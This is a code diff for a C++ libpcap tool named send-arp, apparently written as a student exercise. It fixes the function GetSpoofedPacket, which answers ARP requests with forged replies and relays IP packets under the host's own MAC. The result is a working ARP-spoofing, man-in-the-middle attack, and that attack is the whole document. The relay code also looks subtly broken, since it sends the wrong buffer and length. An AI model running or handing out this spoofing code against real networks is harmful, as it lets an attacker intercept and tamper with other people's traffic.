@@ -22,14 +22,6 @@ ArpHdr arp_;
 };
 #pragma pack(pop)
 
-#pragma pack(push, 1)
-struct EthIpPacket {
-EthHdr eth_;
-IpHdr ip_;
-TcpHdr tcp_;
-};
-#pragma pack(pop)
-
 void usage() {
     printf("syntax : send-arp <interface> <sender ip> <target ip> <sender ip> <target ip>\n");
     printf("sample : send-arp wlan0 192.168.10.2  192.168.10.1  192.168.10.1  192.168.10.2\n");
@@ -191,6 +183,9 @@ void SenderTargetModulation(char* name, char* sender, char* target, map<Ip,Mac> 
 
 void GetSpoofedPacket(char* dev, Ip my_IP_Add, Mac my_Mac_Add, map<Ip,Mac> arp_table){
     map<Ip, Mac>::iterator iter;
+    
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
 
     while (true) {
         struct pcap_pkthdr* header;
@@ -205,20 +200,15 @@ void GetSpoofedPacket(char* dev, Ip my_IP_Add, Mac my_Mac_Add, map<Ip,Mac> arp_t
         get_eth_hdr = (struct EthHdr *)getpacket;
 
         if(ntohs(get_eth_hdr->type_) == 0x0806){  //ARP
-            char* dev = name;
-            char errbuf[PCAP_ERRBUF_SIZE];
-            pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
-
-            //ARP 
             struct ArpHdr *get_arp_hdr;
             getpacket+= sizeof (struct EthHdr );
             get_arp_hdr = (struct ArpHdr *)getpacket;
 
             //ARP Request Unicast to me -> send reply packet 
-            if(get_arp_hdr.arp_.tmac_ == my_Mac_Add){
+            if(get_arp_hdr->tmac_ == my_Mac_Add){
                 EthArpPacket packet;
 
-                packet.eth_.dmac_ = get_eth_hdr.eth_.smac_; //you
+                packet.eth_.dmac_ = get_arp_hdr->smac_; //you
                 packet.eth_.smac_ = my_Mac_Add; //me
                 packet.eth_.type_ = htons(EthHdr::Arp);
 
@@ -227,20 +217,20 @@ void GetSpoofedPacket(char* dev, Ip my_IP_Add, Mac my_Mac_Add, map<Ip,Mac> arp_t
                 packet.arp_.hln_ = Mac::SIZE;
                 packet.arp_.pln_ = Ip::SIZE;
                 packet.arp_.op_ = htons(ArpHdr::Reply);
-                packet.arp_.smac_ = my_macAdd; //me
+                packet.arp_.smac_ = my_Mac_Add; //me
                 packet.arp_.sip_ = htonl(my_IP_Add); //me
-                packet.arp_.tmac_ = get_arp_hdr.arp_.smac_; //you
-                packet.arp_.tip_ = get_arp_hdr.arp_.sip_; //me
+                packet.arp_.tmac_ = get_arp_hdr->smac_; //you
+                packet.arp_.tip_ =get_arp_hdr->sip_; //me
 
                 int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));     
                 printf("ARP Request Unicast Relay! \n");          
             }
 
             //ARP Request Broadcast -> send reply packet like I am target 
-            if(get_arp_hdr.arp_.tmac_ == Mac("00:00:00:00:00:00")){
+            if(get_arp_hdr->tmac_ == Mac("00:00:00:00:00:00")){
                 EthArpPacket packet;
 
-                packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF") //broadcast
+                
                 packet.eth_.smac_ = my_Mac_Add; //me
                 packet.eth_.type_ = htons(EthHdr::Arp);
 
@@ -249,18 +239,22 @@ void GetSpoofedPacket(char* dev, Ip my_IP_Add, Mac my_Mac_Add, map<Ip,Mac> arp_t
                 packet.arp_.hln_ = Mac::SIZE;
                 packet.arp_.pln_ = Ip::SIZE;
                 packet.arp_.op_ = htons(ArpHdr::Reply);
-                packet.arp_.smac_ = my_macAdd; //me
+                packet.arp_.smac_ = my_Mac_Add; //me
 
-                for (iter = arp.begin(); iter != arp.end(); ++iter){
-                    if(iter->first == get_arp_hdr.arp_.sip_)
-                        Mac temp_sender_mac = iter->second;
+                Mac temp_sender_mac ;
+                Ip temp_target_ip;
+
+                for (iter = arp_table.begin(); iter != arp_table.end(); ++iter){
+                    if(iter->first == get_arp_hdr->sip_)
+                        temp_sender_mac = iter->second;
                     else{
-                        Ip temp_target_ip = iter->first;
+                        temp_target_ip = iter->first;
                     }
                 }
+                packet.eth_.dmac_ = temp_sender_mac; //sender
                 packet.arp_.sip_ = htonl(temp_target_ip); //target 
                 packet.arp_.tmac_ = temp_sender_mac; //sender
-                packet.arp_.tip_ = get_arp_hdr.arp_.sip_; //sender
+                packet.arp_.tip_ = get_arp_hdr->sip_; //sender
 
                 int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));    
                 printf("ARP Request Broadcast Relay! \n");                
@@ -269,15 +263,9 @@ void GetSpoofedPacket(char* dev, Ip my_IP_Add, Mac my_Mac_Add, map<Ip,Mac> arp_t
 
         //IP -> send relay with my mac address
         if(ntohs(get_eth_hdr->type_) == 0x0800){  //IP
-            char* dev = name;
-            char errbuf[PCAP_ERRBUF_SIZE];
-            pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf)       ;
-
-            packet.eth_.smac_ = my_Mac_Add;
-            
             memcpy((u_char *)(getpacket + 6), &(my_Mac_Add), 6);
 
-            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&getpacket), sizeof(EthArpPacket));
             printf("IP Relay! \n");    
         }
 
